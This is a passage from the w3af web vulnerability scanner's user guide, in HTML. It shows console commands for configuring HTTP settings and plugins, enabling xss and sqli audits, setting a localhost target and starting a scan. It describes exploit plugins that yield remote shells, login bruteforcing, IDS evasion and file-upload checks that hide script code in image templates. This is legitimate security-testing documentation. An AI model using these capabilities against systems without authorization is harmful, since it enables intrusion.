<FONT FACE="Nimbus Mono L, monospace">| ignoreSessCookies        |
False              | Ignore      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | session     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | cookies     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">| cookieJarFile            |   
                | Set the     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | cookiejar   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | filename.   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B>
set timeout 5</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B>
view</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">| timeout                  | 5 
                | The         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">To
summarize, the “view” command is used to list all configurable
parameters, with their values and a description. The set command is
used to change a value. Finally we can execute “back”, “.” or
press CTRL+C to return to the previous menu. A detailed help for
every configuration parameter can be obtained using “help
parameter” as  shown in this example:</FONT></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B>
help timeout</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">Help
for parameter timeout:</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">===========================</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">Set
low timeouts for LAN use and high timeouts for slow Internet
connections.</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B></FONT></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal; font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">The
“http-settings” and the “misc-settings” configuration menus
are used to set system wide parameters that are used by the
framework. All the parameters have defaults and in most cases you can
leave them as they are. w3af was designed in a way that allows
beginners to run it without having to learn a lot of its internals.
It is also flexible enough to be tuned by experts that know what they
want and need to change internal configuration parameters to fulfill
their tasks.</FONT></P>
<P STYLE="font-style: normal; font-weight: medium"><BR><BR>
</P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<H3 CLASS="western" STYLE="page-break-before: always">Running w3af
with GTK user interface</H3>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="font-style: normal">The framework also has a graphical user
interface that you can start by executing:</P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>$
</B>./w3af_gui</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal; font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">The
graphical user interface allows you to perform all the actions that
the framework offers and features a much easier and faster way to
start a scan and analyze the results.</FONT></P>
<P ALIGN=JUSTIFY STYLE="font-style: normal; font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">In
case you are wondering  what the graphical user interface looks like,
here is a screenshot:</FONT></P>
<P ALIGN=JUSTIFY STYLE="font-style: normal; font-weight: medium"><FONT COLOR="#000000"><IMG SRC="w3af-users-guide_html_m51b850c5.png" NAME="graphics1" ALIGN=LEFT WIDTH=626 HEIGHT=418 BORDER=2></FONT><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal; font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">For
more details please read the “gtkUiUsersGuide”.</FONT></P>
<H3 CLASS="western" STYLE="page-break-before: always">Plugins</H3>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>Plugins do all the magic. The plugins will find the
URLs, discover the vulnerabilities and exploit them. So now, we will
learn how to configure the plugins. In a previous section it was
explained that w3af had three core types of plugins: discovery, audit
and exploit.  The complete list of plugins types is:</P>
<P><BR><BR>
</P>
<UL>
	<LI><P>discovery</P>
	<LI><P>audit</P>
	<LI><P>grep</P>
	<LI><P>exploit</P>
	<LI><P>output</P>
	<LI><P>mangle</P>
	<LI><P>bruteforce</P>
	<LI><P>evasion</P>
</UL>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>Discovery plugins find new points of injection that
are later used by audit plugins to find vulnerabilities. Grep plugins
analyze all page content and find vulnerabilities on pages that are
requested by other plugins; for example, a grep plugin will find a
comment on the HTML body that has the word “password” inside it 
and generate a vulnerability based on it.</P>
<P ALIGN=JUSTIFY>Exploit plugins [ab]use the vulnerabilities found in
the audit phase and return something useful to the user ( remote
shell, SQL table dump, a proxy, etc ).</P>
<P ALIGN=JUSTIFY>Output plugins are the way the framework and the
plugins communicate with the user. Output plugins save the data to a
text or html file. Debugging information is also sent to the output
plugins and can be saved for analysis.</P>
<P ALIGN=JUSTIFY>Mangle plugins allow modification of requests and
responses based on regular expressions, think “sed (stream editor)
for the web”.</P>
<P ALIGN=JUSTIFY>Bruteforce plugins will bruteforce logins. These
plugins are  part of the discovery phase. 
</P>
<P ALIGN=JUSTIFY>Finally, evasion plugins try to evade simple
intrusion detection rules.</P>
<H3 CLASS="western"></H3>
<H3 CLASS="western" STYLE="page-break-before: always">Plugin
configuration</H3>
<P ALIGN=JUSTIFY>The plugins are configured using the “plugins”
configuration menu. 
</P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
help</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
list       | List available plugins.                        | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
back       | Go to the previous menu.                       | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
exit       | Exit w3af.                                     | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
assert     | Check assertion.                               | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
mangle     | View, configure and enable mangle plugins      | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
evasion    | View, configure and enable evasion plugins     | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
discovery  | View, configure and enable discovery plugins   | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
grep       | View, configure and enable grep plugins        | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
bruteforce | View, configure and enable bruteforce plugins  | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
audit      | View, configure and enable audit plugins       | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
output     | View, configure and enable output plugins      | </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B></FONT></P>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">All
plugins can be configured here except the exploit plugins.,   The
example below demonstrates how to find the syntax for a plugin:</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
help audit</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">View,
configure and enable audit plugins </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Syntax:
audit [config plugin | plugin1[,plugin2 ... pluginN] | desc plugin] </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example:
audit </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
All enabled audit plugins are listed. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example2:
audit LDAPi,blindSqli </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
LDAPi and blindSqli are configured to run </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example3:
audit config LDAPi </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
Enters to the plugin configuration menu. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example4:
audit all,!blindSqli </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
All audit plugins are configured to run except blindSqli. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example5:
audit desc LDAPi </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
You will get the plugin description. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Example6:
audit LDAPi,blindSqli </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium">          <FONT FACE="Nimbus Mono L, monospace">audit
!LDAPi </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Result:
LDAPi is disabled in the second command, only blindSqli will run. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
help list</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">List
available plugins. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Syntax:
list {plugin type} [all | enabled | disabled] </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">By
default all plugins are listed. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B></FONT></P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">The
example below demonstrates the use of the list command to see all
available plugins and their status.</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
list audit</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
Plugin name       | Status  | Conf | Description           | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
LDAPi             |         |      | Find LDAP injection   | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | bugs.                 | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
blindSqli         |         | Yes  | Find blind SQL        | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | injection             | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | vulnerabilities.      | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
buffOverflow      |         |      | Find buffer overflow  | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | vulnerabilities.      | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
dav               |         |      | Tries to upload a     | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | file using HTTP PUT   | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | method.               | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
eval              |         |      | Finds incorrect usage | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | of the eval().        | </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">To
enable the xss and sqli plugins, and then verify that the command was
understood by the framework, we issue this set of commands:</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit xss, sqli</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
Plugin name       | Status  | Conf | Description           | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
sqli              | Enabled |      | Find SQL injection    | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | bugs.                 | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
xss               | Enabled | Yes  | Find cross site       | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | scripting             | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | vulnerabilities.      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
xst               |         |      | Verify Cross Site     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | Tracing               | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
                  |         |      | vulnerabilities.      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B></FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY>Or if the user is interested in knowing exactly what
a plugin does, he can also run the “<FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">desc”
</SPAN></FONT>command like this:</P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit desc fileUpload</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">This
plugin will try to expoit insecure file upload forms.</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: -0.98in; font-weight: medium">              
<FONT FACE="Nimbus Mono L, monospace">One configurable parameter
exists:</FONT></P>
<P STYLE="margin-left: -0.98in; font-weight: medium">                
       <FONT FACE="Nimbus Mono L, monospace">- extensions</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
extensions parameter is a comma separated list of extensions that
this plugin will try to upload. Many web applications             
verify the extension of the file being uploaded, if special
extensions are required, they can be added here.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Some
web applications check the contents of the files being uploaded to
see if they are really what their extension                is
telling. To bypass this check, this plugin uses file templates
located at &quot;plugins/audit/fileUpload/&quot;, this templates</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">are
valid files for each extension that have a section ( the comment
field in a gif file for example ) that can be replaced</FONT></P>
<P STYLE="font-weight: medium">     <FONT FACE="Nimbus Mono L, monospace">by
scripting code ( PHP, ASP, etc ).</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">After
uploading the file, this plugin will try to find it on common
directories like &quot;upload&quot; and &quot;files&quot; on every
know directory. If the file is found, a vulnerability exists.</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B></FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">Now
we know what this plugin does, but let's check their internals:</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit config xss</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/audit/config:xss&gt;&gt;&gt;
</B>view</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|------------------------------------------------------------|
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
Setting         | Value | Description                      | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|------------------------------------------------------------|
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
numberOfChecks  | 3     | Set the amount of checks to      | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
                |       | perform for each fuzzable        | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
                |       | parameter. Valid numbers: 1 to   | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
                |       | 13                               | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|
checkStored     | True  | Search persistent XSS            | </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">|------------------------------------------------------------|
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff"><B>w3af/plugin/xss&gt;&gt;&gt;</B><B>
</B>set checkStored False</SPAN></FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/xss&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit config sqli</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/audit/config:sqli&gt;&gt;&gt;
</B>view </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
Setting          | Value       | Description               | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/audit/config:sqli&gt;&gt;&gt;
</B></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B><SPAN STYLE="background: #ffffff">w3af/plugins/audit/config:sqli&gt;&gt;&gt;
</SPAN></B><SPAN STYLE="font-weight: medium"><SPAN STYLE="background: #ffffff">back</SPAN></SPAN></FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B></FONT></P>
<P STYLE="font-weight: medium"> 
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">The
configuration menus for the plugins also have the set command for
changing the parameters values, and the view command for listing
existing values. On the previous example we disabled persistent cross
site scripting checks in the xss plugin, and listed the options of
the sqli plugin (it actually has no configurable parameters).</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<H2 CLASS="western">Starting a scan</H2>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">After
configuring all desired plugins the user has to set the target URL
and finally start the scan. The target selection is done this way:</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
target</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;
</B>set target http://localhost/</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<P><BR><BR>
</P>
<P STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">Finally,
you execute “start” in order to run all the configured plugins.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
start</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">At
any time during the scan, you may hit “enter” in order to get a
live status of the w3af core. Status lines look like this:</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Status:
Running discovery.webSpider on http://localhost/w3af/ | Method: GET.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<H3 CLASS="western">A complete session</H3>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">An
example of an entire w3af session appears below.  Attention should be
paid to the inline comments as they provide additional details.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output console,textFile</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output config textFile</FONT></P>
